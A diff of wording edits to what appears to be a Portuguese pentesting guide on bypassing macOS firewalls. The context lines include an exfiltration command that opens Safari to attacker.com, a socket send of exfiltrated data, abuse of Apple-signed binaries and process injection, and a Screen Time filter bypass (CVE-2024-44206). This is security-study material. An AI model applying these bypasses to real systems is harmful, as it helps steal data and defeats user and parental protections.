@@ -14,7 +14,7 @@ As seguintes técnicas foram encontradas funcionando em alguns aplicativos de fi
 
 - Se o firewall pedir permissão ao usuário, faça o malware **clicar em permitir**
 
-### **Use binários assinados pela Apple**
+### **Usar binários assinados pela Apple**
 
 - Como **`curl`**, mas também outros como **`whois`**
 
@@ -26,7 +26,7 @@ O firewall pode estar permitindo conexões a domínios bem conhecidos da Apple, 
 
 Algumas ideias para tentar contornar firewalls
 
-### Verifique o tráfego permitido
+### Verificar tráfego permitido
 
 Saber o tráfego permitido ajudará você a identificar domínios potencialmente na lista branca ou quais aplicativos têm permissão para acessá-los.
 ```bash
@@ -65,6 +65,7 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 
 Se você puder **injetar código em um processo** que tenha permissão para se conectar a qualquer servidor, poderá contornar as proteções do firewall:
 
+
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
@@ -75,7 +76,7 @@ macos-proces-abuse/
 
 ### Bypass do filtro de conteúdo da web (Tempo de Tela) – **CVE-2024-44206**
 Em julho de 2024, a Apple corrigiu um bug crítico no Safari/WebKit que quebrou o “filtro de conteúdo da web” em todo o sistema usado pelos controles parentais do Tempo de Tela. 
-Uma URI especialmente elaborada (por exemplo, com “://” codificado em URL duplo) não é reconhecida pela ACL do Tempo de Tela, mas é aceita pelo WebKit, portanto, a solicitação é enviada sem filtragem. Qualquer processo que possa abrir uma URL (incluindo código sandboxed ou não assinado) pode, portanto, acessar domínios que estão explicitamente bloqueados pelo usuário ou por um perfil MDM.
+Um URI especialmente elaborado (por exemplo, com “://” codificado em URL duplo) não é reconhecido pela ACL do Tempo de Tela, mas é aceito pelo WebKit, portanto, a solicitação é enviada sem filtragem. Qualquer processo que possa abrir uma URL (incluindo código sandboxed ou não assinado) pode, portanto, acessar domínios que estão explicitamente bloqueados pelo usuário ou por um perfil MDM.
 
 Teste prático (sistema não corrigido):
 ```bash
@@ -108,11 +109,11 @@ s.send(b"exfil...")
 
 ## Dicas de ferramentas para macOS moderno
 
-1. Inspecione as regras atuais do PF que os firewalls GUI geram:
+1. Inspecione as regras PF atuais que os firewalls GUI geram:
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. Enumere os binários que já possuem a permissão *outgoing-network* (útil para piggy-backing):
+2. Enumere os binários que já possuem a concessão *outgoing-network* (útil para piggy-backing):
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
